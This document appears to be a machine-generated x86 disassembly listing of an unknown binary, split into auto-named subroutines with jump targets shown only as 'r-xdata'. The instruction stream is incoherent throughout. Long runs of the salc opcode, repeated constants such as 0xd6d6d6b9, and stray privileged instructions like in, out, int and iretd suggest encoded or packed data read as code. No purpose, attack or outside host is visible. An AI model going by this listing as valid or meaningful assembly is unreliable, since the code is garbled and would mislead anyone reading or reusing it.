scasb [ edi ]
dec sp
inc esi
inc esi
scasd [ edi ]
loop r-xdata
push ss
scasd [ edi ]
sub eax 0xc546464c
and ah [ edx + 0x56 ]
inc esi

inc esi
inc esi
jg r-xdata
salc
dec ecx
retn 0x625d
dec edx
dec ecx
retn 0x9943
sub_47100c
mov ecx 0x9ef1cdb9
inc esi
inc esi
inc esi
jge r-xdata
dec esp
inc esi
inc esi
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
rcl [ cs : ebp + 0x67 ] 0x1
clc
adc edi ecx
add [ esi - 0x51 ] cl
jmp r-xdata
dec ecx
retn 0x98b1
dec ecx
retn 0x4dd3
sub_471079
mov edi 0x82c5b9b9
dec edx
scasd [ edi ]
stosd [ edi ]
dec ebp
inc esi
inc esi
scasd [ edi ]
push ebp
mov esi 0xd6d6b9b9
salc
salc
salc
int 0x87
scasd [ edi ]
out dx eax
mov al [ 0xffffffffcd16b9b9 ]
add ah [ edx + 0x6e ]
scasb [ edi ]
rcl [ edi + 0x46 ] 0x46
pop ds
pop ds
inc esi
mov [ esi + 0x46 ] 0x2c
inc esi
mov ecx 0xb96e6232
adc [ edx ] dh
int 0x2
bound edx [ esi + 0x47 ]
add ah [ edx + 0x5e ]
mov ecx 0xcd5a6202
add ah [ edx + 0x5a ]
jge r-xdata
mov ecx 0x49b9c3b9
retn 0x67a3
pop esi
dec ecx
les eax [ esi - 0x3c464667 ]
mov ecx 0x67a3c249
inc esi
inc esi
lds edi [ edx ]
bound esp [ edx + 0x46 ]
dec ecx
retn 0x679c
sub_4710d9
inc esi
inc esi
scasd [ edi ]
cwde
movsd [ edi ] [ esi ]
mov ecx 0xd6d6d6b9
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
lds eax [ edx - 0x2350eab6 ]
xchg edx eax
mov ecx 0xd6d6d6b9
salc
salc
salc
salc
salc
adc eax 0x114487c5
int 0xbc
lds edi [ ebx + ebp * 2 + 0x465b6daf ]
inc esi
salc
salc
salc
and bh cl
add esi [ eax + 0x466018af ]
inc esi
salc
salc
mov ecx 0xbecd4210
sub al 0x22
adc [ edi - 0x464641e6 ] ebp
salc
salc
salc
salc
salc
mov ecx 0x3cd1230
dec esi
mov ecx 0x59afb233
mov esp 0x9caeb9b9
dec esi
inc esi
inc esi
lds eax [ edx - 0x50793cae ]
test al 0xba
mov ecx 0xd6d6d6b9
salc
salc
salc
salc

sub_47119e
inc esi
salc
salc
salc
salc
salc
salc
int 0xb8
and bh cl
cmp edi eax
int 0xbd
and bh cl
cmp eax [ esi + 0x31afbfcd ]
dec eax
inc esi
inc esi
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
adc ecx ebp
stosb [ edi ]
scasd [ edi ]
ja r-xdata
salc
salc
salc
salc
adc ebp [ edi - 0x46464270 ]
salc
salc
salc
int 0x32
sti
mov [ 0x1bcd8f75 ] al
mov dl 0xaf
jns r-xdata
mov ecx 0xd6d6d6b9
salc
salc
salc
jge r-xdata
int 0x3
dec esi
mov ecx 0x59afb233
mov esp 0x9caeb9b9
dec esi
inc esi
inc esi
lds eax [ edx - 0x50793cae ]
test al 0xba
mov ecx 0xd6d6d6b9
salc
salc
salc
salc

mov ecx 0xafd6d6b9
0x465f
mov ecx 0xb91516b9
adc [ edx - 0x31 ] dl
sti
xchg edx eax
mov ebx 0x86c3b9b9
dec ecx
retn
dec ecx
retn 0xbb94
sub_4711e3
sbb edi [ edx - 0x304df431 ]
adc edi [ esi - 0x5045fc33 ]
pushad
mov ah 0xb9
mov ecx 0xd6d6d6d6
salc
salc
salc
salc
salc
scasd [ edi ]
in eax dx
mov al [ 0xffffffffd6d6b9b9 ]
salc
salc
salc
salc
salc
salc
salc
dec ecx
retn 0x59fb
sub_47120e
inc esi
inc esi
mov ecx 0x81cda233
scasd [ edi ]
inc [ ecx + 0x46 ]
inc esi
salc
salc
adc ch cl
mov dh 0xaf
aas
pushfd
mov ecx 0xd6d6d6b9
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
sub al 0x32
and bh cl
add ebp [ edx - 0x50d0d3e2 ]
add [ ecx + 0x46 ] 0x46
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
adc [ esi ] ebp
adc [ ecx ] edx
adc [ ecx ] edx

sub_47127c
inc esi
inc esi
sub al 0x42
scasd [ edi ]
push ss
pop esi
inc esi
inc esi
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
and bh cl
cmp edi [ edx + 0x20042c19 ]
iretd
sub_4712c3
cmp esi esi
sbb [ edi + 0x46465ac2 ] ebp
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
scasb [ edi ]
je r-xdata
salc
salc
salc
salc
salc
salc
salc
salc
jge r-xdata
mov ecx 0x5cc7afb9
inc esi
inc esi
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
and bh cl
add ebx [ esi + 0x46454baf ]
inc esi
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
dec ecx
retn
salc
salc
salc
scasd [ edi ]
in eax dx
mov al [ 0xffffffffd6d6b9b9 ]
salc
salc
salc
salc
salc
salc
salc
dec ecx
retn 0x59fb
dec ecx
retn 0x5387
sub_471342
sti
xchg edx eax
mov ebx 0x10b9b9b9
push esi
scasd [ edi ]
pop edi
mov eax 0xd6d6b9b9
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
adc [ ecx + 0x4646ead0 ] edi
inc esi
int 0x5
push edx
sub al 0x42
iretd
sub_47139e
add ah [ edx + 0x5e ]
scasd [ edi ]
ror [ esi + 0x46 ] 0x46
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
sbb [ edi + 0x46465daf ] ch

sub_471410
add ebp [ esi + ebx - 0x4647a251 ]
mov ecx 0xa2cb3acd
jne r-xdata
cmpsd [ esi ] [ edi ]
mov ecx 0xd6d6d6b9
salc
jne r-xdata
int 0x88
int 0x99
xchg ebp eax
mov ebp 0xaf4e80c5
fldcw [ esi + 0x46 ]
inc esi
salc
salc
salc
and ch al
mov edi 0x9a53af1a
mov ecx 0xd6d6d6b9
salc
retn
mov ecx 0x4646ead0
inc esi
int 0x5
push edx
sub al 0x42
iretd
sbb [ 0xffffffffd6d6d685 ] bl
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
pop ss
push ss
sub al 0x44
cwde
sub edx [ ecx - 0x750e461b ]
inc esi
inc esi
inc esi
scasb [ edi ]
cmp [ ebx + 0x13afb9b9 ] 0x9f
mov ecx 0x20d6d6b9
iretd
sub_47143d
xchg [ ecx - 0x3e ] cl
xor [ esi + 0x46 ] esp
inc esi
jne r-xdata
scasd [ edi ]
pop ebx
cmpsd [ esi ] [ edi ]
mov ecx 0xd6d6d6b9
salc
jne r-xdata
push es
scasd [ edi ]
aaa
inc si
inc esi
salc
salc
salc
salc
salc
salc
salc
sub al 0x22
and bh cl
add ebp [ esi + 0x20342c1e ]
iretd
mov ecx 0x4646ead0
inc esi
int 0x5
push edx
sub al 0x42
iretd
sbb [ 0xffffffffd6d6d685 ] bl
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
pop ss
push ss
sub al 0x44
cwde
sub edx [ ecx - 0x750e461b ]
inc esi
inc esi
inc esi
scasb [ edi ]
cmp [ ebx + 0x13afb9b9 ] 0x9f
mov ecx 0x20d6d6b9
iretd
sub_4714d2
pop ds
mov ecx 0x8675b9b9
test esi edx
salc
salc
salc
salc
salc
salc
salc
int 0xb8
and bh cl
cmp ecx [ esi - 0x7a50468b ]
inc esi
inc esi
salc

sub_4714f0
shl [ esi - 0x50464643 ] cl
mov bh 0xbf
mov ecx 0x6a10b9b9
jle r-xdata
or esi [ esi + 0x682c8ecd ]
and bh cl
or esi [ edi + ebx - 0x4df430e0 ]
int 0x8e
scasd [ edi ]
xor [ edx - 0x79d04647 ] edx
retn 0x4646
push esi
scasd [ edi ]
cmpsb [ esi ] [ edi ]
push eax
inc esi
inc esi
salc
salc
salc
salc
salc
sub al 0x2f
and bh cl
or ebp [ edx + 0x20282c1f ]
iretd
sub_471535
inc esi
inc ebp
rol [ esi - 0x34b9b9ba ] 0xcb
mov esi 0xaeb9b9bb
sahf
inc esi
inc esi
mov ecx 0x4646fac0
inc esi
scasd [ edi ]
inc ebx
mov edx 0xd6d6b9b9
retn
sub_471577
add ebp [ edx - 0x51 ]
jb r-xdata
or ebp [ eax + 0xbcf201f ]
mov dh 0xcd
mov gs [ eax + ebp * 2 ]
and bh cl
or esi [ edi + ebx - 0x4df430e0 ]
int 0x8e
scasd [ edi ]
xor [ edx - 0x79d04647 ] edx
retn 0x4646
mov ecx 0xd6d6d6b9
salc
salc
salc
salc
salc
salc
mov ecx [ cs : edx - 0x30ee7fce ]
ror dl 0x46
inc esi
inc esi
scasb [ edi ]
mov ch 0xab
mov ecx 0xc9a42eb9
pop ds
push ds
adc edi ecx
rcr dh 0x46
inc esi
inc esi
scasd [ edi ]
in al dx
stosb [ edi ]
mov ecx 0xcfd6b9
cmp ch [ esi - 0x46465461 ]
or [ cs : ebp - 0x30eeb4c8 ] edi
add [ edx - 0x52 ] ch
lea ebp [ ebx - 0x59d14647 ]
jpo r-xdata
inc esi
inc edi
inc esi
scasd [ edi ]
inc esi
inc edx
inc esi
inc esi
salc
dec ecx
in al 0xaf
pop eax
inc eax
inc esi
inc esi
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
and bh cl
sbb esi eax
scasd [ edi ]
iretd
jo r-xdata
test esi edx
salc
salc
salc
insd
or [ ecx - 0x3e ] 0x46464760
sbb [ eax ] ebx
retn
scasd [ edi ]
outsb
scasb [ edi ]
mov ecx 0xd6d6d6b9
salc
salc
salc
salc
sbb ch cl
sbb [ ecx ] 0xd6d6851b
sub_4715e7
xchg [ edi + 0x46465198 ] ch
salc
salc
salc
salc
salc
mov ecx 0xacafa233
mov bl 0xb9
mov ecx 0xd6d6d6d6
salc
salc
salc
salc
salc
salc
int 0x87
and bh cl
add ebx [ ebp + ecx * 8 + 0x4cceaf80 ]
inc esi
inc esi
salc
salc
scasb [ edi ]
pop edx
pop ebx
inc esi
inc esi
scasd [ edi ]
mov eax [ 0xffffffffd6b9b9b2 ]
pop [ ebp - 0x2929292a ]
salc
salc
salc
salc
add [ esi + 0x44 ] 0xaf464746
inc esi
inc edx
inc esi
inc esi
salc
dec ecx
in al 0xaf
pop eax
inc eax
inc esi
inc esi
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
and bh cl
sbb esi eax
scasd [ edi ]
iretd
sub_4716a7
inc esi
scasd [ edi ]
pop edx
inc esi
inc esi
salc
adc eax 0x19af51b9
sahf
mov ecx 0xd6d6d6b9
salc
salc
salc
salc
dec ecx
retn
sub_47172c
inc esi
adc [ edi - 0x46464b8c ] ch
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
adc eax 0xb99a65af
mov ecx 0x46446af9
inc esi
adc ebx ecx
retn
sub_471785
scasd [ edi ]
clc
inc edx
inc esi
inc esi
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
mov ecx 0x4646c6d0
inc esi
scasd [ edi ]
into
popfd
mov ecx 0x76462eb9
inc esi
inc esi
mov ecx 0x30b91630
jb r-xdata
and al ch
mov esi 0x19c249b9
push ebp
inc esi
inc esi
mov ecx 0x2c4a6232
inc esi
inc esi
inc esi
push esi
inc esi
sub al 0x45
dec esi
iretd
cmp ebx [ ebx - 0x29294647 ]
salc
mov ecx 0xae5e6232
and [ eax - 0x7d3a4647 ] 0x4a
inc esi
mov [ esi + 0x46 ] 0x15
mov ecx 0xb95e6232
adc [ edx ] dh
add [ ecx + 0x495e620a ] edi
retn
sub_4717f0
cmp edi [ ebp + esi * 2 - 0x43785047 ]
mov ecx 0xd6d6d6b9
sbb [ ebp - 0x2929292a ] al
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
int 0xb8
and bh cl
cmp eax [ edx - 0x4132efd4 ]
scasd [ edi ]
cld
lahf
mov ecx 0xb603cbb9
adc eax 0xaebeaf16
mov ecx 0xd6d6d6b9
int 0xaa
lds ebp [ edx + 0x11101566 ]
scasb [ edi ]
adc [ eax - 0x41324647 ] 0xc3
mov ecx 0xa8f4c249
mov ecx 0x44642eb9
stc
int3
sub_4719fd
add [ esi + 0x46 ] 0x46
scasd [ edi ]
fisttp [ eax + 0x46 ]
inc esi
and bh cl
add ebp [ eax - 0x4652ce51 ]
mov ecx 0xd6d6d6d6
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
adc ebp [ edi + 0x46464d81 ]
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
mov ecx 0x3cfae33
mov esi 0xb99a78af
mov ecx 0xc5aacd13
mov [ 0xffffffffd2aac7be ] al
inc edx
inc esi
inc esi
adc eax 0x68ae1110
movsb [ edi ] [ esi ]
mov ecx 0x75b6cdb9
popfd
jge r-xdata
mov ecx 0xd6d6d6b9
salc
dec ecx
retn
sub_471a68
inc esi
inc esi
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
and bh cl
sbb esp [ edi + ebp * 4 + 0x46465119 ]
salc
salc
salc
salc
salc
salc
and bh cl
add edi [ esp + ebp - 0x30dfe1dd ]
add edi [ edx - 0x30df798b ]
add edi [ eax + 0x16b603cb ]
int 0x3
dec esi
scasb [ edi ]
mov bh [ ss : ecx - 0x7a70e047 ]
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
adc eax 0xa59fae16
mov ecx 0x4a82c5b9

sub_471ade
xchg [ ecx - 0x3e ] cl
xchg esi eax
push ecx
inc esi
inc esi
scasd [ edi ]
xchg edi eax
lea edi [ ecx - 0x29292947 ]
salc
salc
salc
salc
salc
salc
salc
and [ ebp ] bh
inc eax
scasd [ edi ]
mov es [ esi + 0x46 ]
inc esi
salc
retn
sub_471aff
xchg [ ecx - 0x3e ] cl
shr [ esi - 0x50ee4647 ] cl
int1
dec edx
inc esi
inc esi
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
pop [ ebp + 0x20d6d6d6 ]
lds edi [ eax + 0x46 ]
scasd [ edi ]
adc al 0x43
inc esi
inc esi
salc
salc
salc
salc
salc
sub al 0x1e
and bh cl
add esi [ edx + 0x3cf201e ]
mov al 0x75
xchg [ edx + edx * 2 ] ch
scasd [ edi ]
lodsb [ esi ]
dec esi
inc esi
inc esi
salc
salc
salc
lds edi [ edi + 0x44c34974 ]
popfd
mov ecx 0x4e0ecdb9
int 0x81
scasd [ edi ]
xchg [ ecx + edi * 4 - 0x6292947 ] bh
inc edx
inc edi
inc esi
inc esi
adc ebx ecx
retn
sub_471b5d
mov esi 0x7516b9b9
popfd
adc eax 0xc30a10b9
xchg [ ecx - 0x3e ] cl
inc eax
mov al 0xb9
mov ecx 0xbb8ec3cb
mov ecx 0x151516b9
sub al 0x5c
adc eax 0xb99398af
mov ecx 0xcd4a33b9
add ecx [ esi - 0x47 ]
push ss
and ch [ edi + 0x46464b88 ]
and bh cl
add ebp [ edx + 0x20232c1e ]
iretd
sub_471b98
add ebp [ eax - 0x4672fa51 ]
mov ecx 0xfeafb67d
push ecx
inc esi
inc esi
salc
salc
salc
salc
salc
salc
dec ecx
0x58ee
sub_471bba
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
dec ecx
lds esp [ ecx - 0x50464647 ]
0x4643
sub_471c04
add eax [ edx ]
scasd [ edi ]
add al 0xb6
mov ecx 0x68af10b9
cmpsd [ esi ] [ edi ]
mov ecx 0xeeaf11b9
xchg edx eax
mov ecx 0xd6d6d6b9
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
iretd
sub_471c2e
add ah [ edx + 0x5a ]
jg r-xdata
mov ecx 0xd6d6d6d6
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
mov ecx 0x464682f1
inc esi
scasb [ edi ]
xor al 0xb3
mov ecx 0x9a1dafb9
mov ecx 0xba1bcfb9
iretd
pop esi
scasd [ edi ]
setb [ ecx - 0x29292947 ]
salc
sub_471ca4
mov ecx 0xc520d6b9
jg r-xdata
scasd [ edi ]
sbb [ edi + 0x15d6b9b9 ] dl
mov ecx 0x4646c6d1
inc esi
scasd [ edi ]
pushad
sahf
mov ecx 0xcf2019b9
cmp edi esi
scasd [ edi ]
xor al 0x47
inc esi
inc esi
salc
pop ss
push [ esi + 0x46 ]
inc esi
inc esi
and cl ch
inc edi
int 0x6
dec edx
int 0x6
dec edx
scasd [ edi ]
loope r-xdata
int 0x87
dec ecx
retn 0x8e1f
salc
salc
salc
salc
salc
salc
jne r-xdata
mov ecx 0xd6d6d6b9
salc
salc
salc
salc
salc
salc
adc edi ecx
add [ edx ] ch
scasb [ edi ]
adc [ eax - 0x2cd14647 ] esp
mov [ 0xffffffffcf11d1ef ] eax
add [ esi + 0x46 ] 0x46
scasb [ edi ]
xor al 0xb3
mov ecx 0x9a1dafb9
mov ecx 0xba1bcfb9
iretd
scasd [ edi ]
ror [ edx - 0x29294647 ] cl
salc
salc
salc
scasb [ edi ]
rol [ edx + 0x46 ] cl
inc esi
sbb [ eax ] ebx
scasd [ edi ]
aaa
xchg ecx eax
mov ecx 0xd6d6d6b9
salc
scasb [ edi ]
cld
cmpsd [ esi ] [ edi ]
mov ecx 0x8a03cfb9
jge r-xdata
push fs
mov ecx 0x682c5b9
jecxz r-xdata
pop ebp
outsb
adc edi ecx
add [ edx ] dh
scasb [ edi ]
jle r-xdata
jb r-xdata
mov ecx 0x44a72eb9
xor edi 0x3e00cf11
scasb [ edi ]
insb
mov al [ 0x7e2eb9b9 ]
jno r-xdata
add [ esi ] dh
scasb [ edi ]
shl [ cs : ebx - 0x30ee2e11 ] cl
retn
scasb [ edi ]
push ds
push ebp
inc esi
inc esi
retn
mov dl 0x11
iretd
sub_471cec
sub al 0x97
mov ecx 0x18af16b9
xchg edi eax
mov ecx 0xb915d6b9
rol esi 0x1
inc esi
inc esi
salc
salc
salc
salc
salc
salc
jne r-xdata
mov ecx 0xd6d6d6b9
salc
salc
salc
salc
salc
salc
adc edi ecx
add [ edx ] ch
scasb [ edi ]
adc [ eax - 0x2cd14647 ] esp
mov [ 0xffffffffcf11d1ef ] eax
add [ esi + 0x46 ] 0x46
scasb [ edi ]
xor al 0xb3
mov ecx 0x9a1dafb9
mov ecx 0xba1bcfb9
iretd
scasd [ edi ]
ror [ edx - 0x29294647 ] cl
salc
salc
salc
scasb [ edi ]
rol [ edx + 0x46 ] cl
inc esi
sbb [ eax ] ebx
scasd [ edi ]
aaa
xchg ecx eax
mov ecx 0xd6d6d6b9
salc
scasb [ edi ]
cld
cmpsd [ esi ] [ edi ]
mov ecx 0x8a03cfb9
jge r-xdata
push fs
mov ecx 0x682c5b9
jecxz r-xdata
pop ebp
outsb
adc edi ecx
add [ edx ] dh
scasb [ edi ]
jle r-xdata
jb r-xdata
inc esi
scasd [ edi ]
pushad
sahf
mov ecx 0xcf2019b9
cmp edi esi
scasd [ edi ]
xor al 0x47
inc esi
inc esi
salc
pop ss
push [ esi + 0x46 ]
inc esi
inc esi
and cl ch
inc edi
int 0x6
dec edx
int 0x6
dec edx
scasd [ edi ]
loope r-xdata
scasd [ edi ]
sbb [ edi + 0x15d6b9b9 ] dl
mov ecx 0x4646c6d1
mov ecx 0x44a72eb9
xor edi 0x3e00cf11
scasb [ edi ]
insb
mov al [ 0x7e2eb9b9 ]
jno r-xdata
add [ esi ] dh
scasb [ edi ]
shl [ cs : ebx - 0x30ee2e11 ] cl
retn
scasb [ edi ]
push ds
push ebp
inc esi
inc esi
retn
mov dl 0x11
iretd
sub_471dfb
mov ecx 0xcf4646b9
sbb edi [ esi + 0x1f1e4581 ]
pop ds
pop ds
and [ ebp - 0x69 ] bh
scasd [ edi ]
mov bl [ ebp - 0x29294647 ]
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
sub al 0x1a
push ds
scasd [ edi ]
sahf
mov [ 0xffffffffcdd6b9b9 ] eax
add ah [ edx + 0x42 ]
int3
sub_47203d
inc esi
inc esi
jne r-xdata
retn
jg r-xdata
salc
salc
salc
lds eax [ edi - 0x4f3cdfbc ]
scasd [ edi ]
mov cl 0xa1
mov ecx 0xd6d6d6b9
salc
salc
lds eax [ esi + edx * 4 - 0x4658c251 ]
mov ecx 0x3cf20d6
0xcd302c1e 0x20be
iretd
bound esi [ edx + 0x49 ]
retn
sub_472061
xchg [ ecx - 0x3e ] cl
neg [ ebx + 0x46 ]
inc esi
int 0x8
outsb
int 0x3
xchg edx eax
scasd [ edi ]
or [ esi - 0x29294647 ] bh
salc
scasd [ edi ]
mov ebp 0xd6b9b9a1
salc
salc
salc
salc
lds eax [ edi - 0x4f3cdfbc ]
scasd [ edi ]
mov cl 0xa1
mov ecx 0xd6d6d6b9
salc
salc
lds eax [ esi + edx * 4 - 0x4658c251 ]
mov ecx 0x3cf20d6
0xcd302c1e 0x20be
iretd
sub_4721a2
inc ecx
push ss
mov [ ecx + 0x4646468c ] 0xde62c2cb
inc esi
inc esi
inc esi
adc [ esi ] edx
int 0x80
scasb [ edi ]
push esi
inc esi
inc esi
lds eax [ edx + 0x57d4af56 ]
inc esi
inc esi
salc

sub_472213
sbb edx [ edx - 0x464dcc47 ]
xor edi [ edx - 0x464a6b51 ]
mov ecx 0xd6d6d6d6
salc
adc ecx ebp
stosb [ edi ]
lds edi [ ebx ]
dec edx
inc esi
scasd [ edi ]
mov [ 0xffffffffd6b9b997 ] al
salc
salc
salc
jne r-xdata
fsubr [ ecx - 0x34344647 ]
jge r-xdata
salc
salc
and bh cl
cmp edi edx
scasd [ edi ]
loop r-xdata
scasd [ edi ]
stosb [ edi ]
stosb [ edi ]
mov ecx 0xd6d6d6b9
salc
salc
salc
salc
salc
salc
salc
salc
lds eax [ edx + 0x623ac556 ]
pop edx
inc esi
iretd
inc esi
inc esi

mov ecx 0x209d75b9
iretd
sub_472259
mov ecx 0x85b2afb9
mov ecx 0xd6d6d6b9
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
add [ ebx ] 0x464647ba
inc esi
int 0x3
mov edx 0x858f1d18
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
sub al 0x64
pop ds
scasd [ edi ]
std
cdq
mov ecx 0xd6d6d6b9
salc
salc
salc
salc
salc

sub_4722f6
adc bh [ ebp + 0x1016b9b9 ]
mov ecx 0x18191611
pop [ ebp - 0x2929292a ]
salc
salc
salc
salc
salc
salc
salc
salc
salc
inc edx
inc edi
inc esi
inc esi
mov ecx 0x4646fed0
inc esi
retn
sub_472336
cmp ah [ edx + 0x52 ]
adc [ esi - 0x464650af ] ch
scasd [ edi ]
sbb edx [ esi + 0x46 ]
inc esi
salc
salc
salc
salc
salc
salc
salc
adc eax 0xb9b24daf
mov ecx 0xd6d6d6d6
salc
salc
salc
salc
dec ecx
retn 0x42e8
sub_47235d
inc esi
inc esi
scasd [ edi ]
or eax 0xc7b9b9b3
stosb [ edi ]
into
inc esp
inc esi
inc esi
dec [ ebx ]
sbb al 0x46
inc esi
adc eax 0x880baf10
mov ecx 0x23c5d6b9
mov edx 0xba0bcb46
scasd [ edi ]
das
mov dh 0xb9
mov ecx 0xd6d6d6d6
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
retn
sub_47239b
xchg [ ecx - 0x3d ] cl
jg r-xdata
push ss
mov ecx 0xc3cb6a10
inc esi
inc esi
scasd [ edi ]
cmp al [ edx + 0x46 ]
inc esi
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
adc ch cl
mov dh 0xaf
xchg esi eax
dec ebp
inc esi
inc esi
salc
salc
salc
salc
salc
add [ ebx ] 0x646664be
arpl [ ecx + 0x352aba03 ] ax
inc esi
mov ecx 0x4646fed0
inc esi
retn
sub_4724b0
mov ecx 0xaf8675b9
cmc
mov [ ecx - 0x29292947 ] edi
salc
salc
salc
salc
salc
salc
salc
scasd [ edi ]
aas
inc ecx
inc esi
inc esi
salc
salc
salc
salc
salc
salc
salc
salc
int 0xf
mov esi 0x45b20b45
add ecx [ esi + 0x17 ]
scasd [ edi ]
rcr [ ecx - 0x29294647 ] 0x1
and [ edi + 0x5 ] bh
add [ ecx - 0x3e ] cl
sub eax [ edi - 0x1064647 ]
dec ebp
inc esi
inc esi
jg r-xdata
dec ecx
retn 0x4642
bound ebx [ edx + 0x49 ]
sub_4724f8
inc esi
inc esi
adc [ ecx - 0xeb6b1f0 ] edi
add eax 0xa201af00
mov ecx 0xd6d6d6b9
salc
salc
salc
lds edi [ ebx ]
dec edx
inc esi
dec ecx
retn
sub_472514
mov ebx 0xdaafb9b9
scasd [ edi ]
mov ecx 0x97c249b9
xchg ecx eax
mov ecx 0xb9462cb9
shr dl 0x1
inc esi
inc esi
inc esi
mov al [ cs : esi + 0x46 ]
inc esi
sub al 0x46
adc [ esi - 0x464660e4 ] ch
scasd [ edi ]
xchg ecx eax
mov ecx 0x2cd6d6b9
and bh cl
adc eax [ esp + ebx + 0x4654a1af ]
inc esi
retn
sub_472553
cmp ah [ edx + 0x6a ]
jg r-xdata
and bh cl
sbb edx [ esi + 0x75 ]
popfd
and bh cl
sbb edx [ edi + ebp * 4 - 0x61 ]
test [ ecx - 0x29292947 ] bh
lds eax [ esi + 0x3752cf20 ]
add [ edi - 0x46464c58 ] ch
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
sbb [ eax ] ebx
sbb eax 0xd6d6858f
salc
salc
salc
salc
salc
salc
salc
adc ch cl
mov bh 0xc3
mov al 0x49
retn 0xa1b1
bound ebx [ edx + 0x49 ]
retn
sub_47256b
inc ebx
inc esi
inc esi
inc esi
add [ edx ] 0x62
push esi
inc esp
scasd [ edi ]
mov esp 0x1db9b98f
and bh cl
sbb ecx [ esi - 0x33 ]
cwde
and bh cl
sbb ecx [ ebp + ecx * 8 - 0x62 ]
and bh cl
sbb ecx [ edx - 0x33 ]
lahf
and bh cl
sbb ecx [ eax - 0x33 ]
sahf
and bh cl
sbb edx [ esi + 0x75 ]
popfd
and bh cl
sbb edx [ edi + ebp * 4 - 0x61 ]
test [ ecx - 0x29292947 ] bh
lds eax [ esi + 0x3752cf20 ]
add [ edi - 0x46464c58 ] ch
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
sbb [ eax ] ebx
sbb eax 0xd6d6858f
salc
salc
salc
salc
salc
salc
salc
adc ch cl
mov bh 0xc3
mov al 0x49
retn 0xa1b1
sub_4725f8
or edi [ edx - 0x4250e9e9 ]
inc eax
inc esi
inc esi
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
adc [ 0xffffffffb9961daf ] edx
mov ecx 0x7acbd6d6
inc ebp
lds edi [ ecx ]
inc edx
inc esi
dec ecx
rcl [ ebp + 0x50 ] 0x46
inc esi
lds esp [ edx ]
bound esp [ edx + 0x46 ]

sub_47262b
add ah [ edx + 0x62 ]
push ss
scasd [ edi ]
add [ ebp - 0x29294647 ] bl
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc

sub_472680
adc [ esi ] dl
and bh cl
adc esp [ eax - 0x464fba51 ]
mov ecx 0xd6d6d6d6
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
retn
sub_4726fa
mov ecx 0xd6d6d6b9
salc
add [ ebx ] 0xb100dae
or eax 0x10aa0381
or ecx [ 0x3812010 ]
mov dh 0xb
inc esi
add [ ebx ] 0x252f0b9e
xor al 0x81
add ebx [ edx + 0x20293529 ]
add [ ebx ] 0xe6632a6
xor [ ecx + 0x231efe03 ] al
sub [ eax ] dl
add [ ebx ] 0x1e0b0bfa
and eax [ ecx + 0x10288603 ]
or ecx [ ebx ]
add [ ebx ] 0x2a34368e
scasw [ edi ]
cdq
push ebx
inc esi
inc esi
salc
salc
salc

sub_4727f0
add eax edx
push ss
adc [ eax ] dl
sub al 0x66
adc [ edi - 0x464647d2 ] ch
adc eax 0xaa03cb15
scasd [ edi ]
jecxz r-xdata
mov ecx 0xc5d6d6b9
or [ edx - 0x3b ] 0x22
bound ebx [ esi + 0x46 ]
mov ecx 0xbbc349b9
cmpsd [ esi ] [ edi ]
mov ecx 0x8d25afb9
mov ecx 0xe0c049b9
cmp [ ecx + 0x6222c5b9 ] 0x62
inc esi
scasd [ edi ]
sbb eax 0xd6b9b984

sub_4728ac
add esi esi
push ss
scasd [ edi ]
pop ebx
xchg edx eax
mov ecx 0xe1f814b9
and [ ecx ] 0x8
scasb [ edi ]
xor eax 0x1fb9b9b3
lds edi [ esi + 0x63c04944 ]
inc esi
inc esi
inc esi
dec ecx
int1
dec esp
stc
sbb al 0x31
inc esi
inc esi
and [ ebp - 0x77 ] bh
dec ecx
retn 0x4648
sub_4728e4
inc eax
inc esi
inc esi
inc esi
